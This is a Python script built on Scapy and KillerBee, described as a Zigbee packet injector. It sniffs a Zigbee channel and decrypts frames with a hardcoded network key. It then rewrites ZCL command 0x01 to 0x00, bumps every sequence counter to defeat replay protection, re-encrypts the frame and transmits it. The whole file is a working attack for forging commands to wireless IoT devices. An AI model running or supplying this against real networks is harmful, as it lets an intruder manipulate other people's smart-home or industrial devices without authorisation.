from unicodedata import decimal
from scapy import *
from killerbee.scapy_extensions import *
import argparse

parser = argparse.ArgumentParser(description="Zigbee packet injector")
parser.add_argument("-c", type=int, dest="channel", choices=range(11, 25) , default=11)

args = parser.parse_args()

key = bytes.fromhex("c7398de1956fbe125d3463a58f1e3a3c")

pkts = kbrdpcap("strippedPackets.pcap")

def craftPacket(pkt, data):
    print(pkt.getlayer("Dot15d4FCS").seqnum)
    pkt.getlayer("Dot15d4FCS").seqnum += 1
    print(pkt.getlayer("Dot15d4FCS").seqnum)
    pkt.getlayer("ZigbeeNWK").seqnum += 1
    data.getlayer("ZigbeeAppDataPayload").counter += 1
    data.getlayer("ZigbeeClusterLibrary").transaction_sequence += 1
    data.getlayer("ZigbeeClusterLibrary").command_identifier = 0x00
    return kbencrypt(pkt, data, key)


while True:
    pkt = kbsniff(args.channel)
    if pkt.haslayer("ZigbeeSecurityHeader"):
        dec = kbdecrypt(pkt, key)
        if dec.haslayer("ZigbeeClusterLibrary") and dec.getlayer("ZigbeeClusterLibrary").command_identifier == 0x01: 
            pkt.show()
            newPkt = craftPacket(pkt, dec)
            newPkt.show()
            kbsendp(newPkt, args.channel)

    